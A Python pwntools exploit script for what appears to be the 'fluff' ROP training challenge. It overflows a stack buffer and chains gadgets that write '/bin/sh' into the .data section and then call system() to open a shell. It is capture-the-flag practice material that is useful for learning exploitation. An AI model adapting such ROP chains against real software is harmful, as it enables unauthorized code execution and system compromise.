from pwn import *

elf= ELF("./fluff")
io=elf.process()

pop_r12_to_mov13d = 0x400832
log.info("pop r12; mov r13d :" + hex(pop_r12_to_mov13d))

dot_data_add = 0x601050
log.info(".data section address to save the string : " + hex(dot_data_add))

xor_r11_to_edi = 0x400822
log.info("GADGET xor r11, r11; pop r14; mov edi, 0x601050; ret; " + hex(xor_r11_to_edi))

xor_r11_to_mov_r13d = 0x40082f
log.info("GADGET  xor r11, r12; pop r12; mov r13d, 0x604060; ret; : " + hex(xor_r11_to_mov_r13d))

xchg_r11_to_mov_r11d = 0x400840
log.info("GADGET xchg r11, r10; pop r15; mov r11d, 0x602050; ret; : " + hex(xchg_r11_to_mov_r11d))

mov_qwrd_to_r12b = 0x40084e
log.info("GADGET mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;  : " + hex(mov_qwrd_to_r12b))

 

payload  = b"A" * 40

payload += p64(pop_r12_to_mov13d) # pop r12; mov r13d, 0x604060; ret;
payload += p64(dot_data_add) # Where to save the string to (.data)
payload += p64(xor_r11_to_edi) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
                                            # NOTE: This gadget puts .data address into EDI for us
payload += b"FAKEXHAH"                      # Junk data for the "pop r14" instruction
payload += p64(xor_r11_to_mov_r13d) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
payload += b"/bin/sh\x00"                   # The string to be popped into R12
payload += p64(0x400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
payload += b"FAKEXHAH"                      # Junk data for the "pop r15" instruction
payload += p64(xor_r11_to_edi) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
payload += b"FAKEXHAH"                      # Junk data for the "pop r14" instruction
payload += p64(xor_r11_to_mov_r13d) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
payload += b"FAKEXHAH"                      # Junk data for the "pop r12" instruction
payload += p64(mov_qwrd_to_r12b) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
payload += b"FAKEXHAH"                      # Junk data for the "pop r13" instruction
payload += b"\x00" * 8                      # Null bytes for the "pop r12" instruction
                                            # NOTE: The next instruction will XOR this with [r10]
payload += p64(0x4005e0) # call system()
 
io.sendline(payload)
io.interactive()
